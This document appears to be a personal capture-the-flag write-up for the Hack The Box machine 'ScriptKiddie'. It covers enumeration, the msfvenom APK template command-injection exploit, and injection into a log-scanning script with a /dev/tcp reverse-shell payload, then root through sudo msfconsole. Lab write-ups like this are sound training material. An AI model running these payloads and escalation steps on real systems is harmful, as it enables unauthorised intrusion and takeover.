#linux 
# Enumeration
## nmap
```bash
nmap -sC -sV scriptkiddie.htb
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-19 01:57 EST
Nmap scan report for scriptkiddie.htb (10.129.95.150)
Host is up (0.19s latency).
Other addresses for scriptkiddie.htb (not scanned): 10.129.95.150
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3c656bc2dfb99d627427a7b8a9d3252c (RSA)
|   256 b9a1785d3c1b25e03cef678d71d3a3ec (ECDSA)
|_  256 8bcf4182c6acef9180377cc94511e843 (ED25519)
5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
|_http-title: k1d5 h4ck3r t00l5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.17 seconds
```

## Check the website

![[Pasted image 20230219213432.png]]

### nmap
Trying 127.0.0.1
![[Pasted image 20230219213521.png]]
the machine's nmap version is 7.80

### payloads
difficult to get result, so skip it for now

### sploits
seems like its searchsploit
tried to put test in the box
![[Pasted image 20230219215606.png]]

look at msfvenom `venom it up` is the keyword?
![[Pasted image 20230219221158.png]]
https://www.exploit-db.com/exploits/49491

## create payload through metasploit
Set LHOST and LPORT then run the exploit.
```
msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > run

[-] Exploit failed: cmd/unix/python/meterpreter/reverse_tcp: All encoders failed to encode.
```
It did not work for some reason due to the payload.

`show payloads` to show all the available shells and switch it to 38.
```
TCP (via AWK)
   38  payload/cmd/unix/reverse_bash                                          normal  No     Unix Command Shell, Reverse 
```

`set payload 38`

https://forum.hackthebox.com/t/metasploit-no-encoders-encoded-the-buffer-successfully/471/10

```
msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > run

[+] msf.apk stored at /home/kali/.msf4/local/msf.apk
```

Now, we have the apk file.

# Foothold
## get the shell
Apk file is for android, so we need to choose android.
os: androld
lhost: 10.10.14.44
apk the one we just created

on kali 
`nc -lnvp 1234`

## shell as kid
```
nc -lnvp 1234        
listening on [any] 1234 ...
connect to [10.10.14.44] from (UNKNOWN) [10.129.95.150] 41102
whoami
kid
```

# Privilege escalation
## enumeration

## /html
has app.py written in flask

app.py
```python
def searchsploit(text, srcip):
    if regex_alphanum.match(text):
        result = subprocess.check_output(['searchsploit', '--color', text])
        return render_template('index.html', searchsploit=result.decode('UTF-8', 'ignore'))
    else:
        with open('/home/kid/logs/hackers', 'a') as f:
            f.write(f'[{datetime.datetime.now()}] {srcip}\n')
        return render_template('index.html', sserror="stop hacking me - well hack you back")

```
this part writes log.

Check the log
```python
Python 3.11.1 (main, Dec 31 2022, 10:23:59) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import datetime
>>> srcip = '10.10.14.44'
>>> print(f'[{datetime.datetime.now()}] {srcip}\n')
[2023-02-19 08:52:44.141615] 10.10.14.44
```

### /logs
there is a file called hackers
```
-rw-rw-r--  1 kid pwn    0 Feb 19 12:33 hackers
```
there is pwn?

### /pwn
recon file and scanlosers.sh
```
drwxrw---- 2 pwn  pwn  4096 Feb 19 12:50 recon
-rwxrwxr-- 1 pwn  pwn   250 Jan 28  2021 scanlosers.sh
```
no permission for recon but we can read scanlosers.sh

## scriptkiddie -> pwn

```bash
kid@scriptkiddie:/home/pwn$ cat scanlosers.sh
cat scanlosers.sh
#!/bin/bash

log=/home/kid/logs/hackers

cd /home/pwn/
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done

if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
```

### command injection
https://0xdf.gitlab.io/2021/06/05/htb-scriptkiddie.html
We can try to inject a command in this shell. Eventually what we want to do is that , since this is owned by pwn, so if we can run a command as pwn then we can get pwn's shell.

#### command injection test
```bash
echo "[2021-05-28 12:37:32.655374] 10.10.14.15" > hackers; cat hackers; echo sleep; sleep 1; cat hackers; echo done
```

sh -c "" part runs nmap and it takes ip. we can append some sort of commands after ip, then we can run nmap and an arbitrary commands.

```shell
cut -d' ' -f3-
```
takes everything after the third word thats separated by a space.

```bash
echo "x x x 127.0.0.1; ping -c 1 10.10.14.15 #" | cut -d' ' -f3-
x 127.0.0.1; ping -c 1 10.10.14.15 #                                 
```

The actual code becomes,
```bash
 sh -c "nmap --top-ports 10 -oN recon/x 127.0.0.1; ping -c 1 10.10.14.15 #.nmap ${ip} 2>&1 >/dev/null" &
```

We can try this payload 

On scriptkiddie machine
`echo "x x x 127.0.0.1; ping -c 1 10.10.14.15 #" > hackers`

On kali machine
`sudo tcpdump -i tun0 icmp`

## Reverse shell payload
Actual payload
```shell
echo "x x x 127.0.0.1; bash -c 'bash -i >& /dev/tcp/10.10.14.44/1234 0>&1' # ." > hackers
```

listen on another shell to get pwn

## pwn -> root

### sudo -l
```bash
pwn@scriptkiddie:~$ sudo -l
sudo -l
Matching Defaults entries for pwn on scriptkiddie:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pwn may run the following commands on scriptkiddie:
    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
```

### metasploit
```
sudo /opt/metasploit-framework-6.0.9/msfconsole
```

### get shell
`msf6 > /bin/bash`

## root flag
go to `/root/root.txt`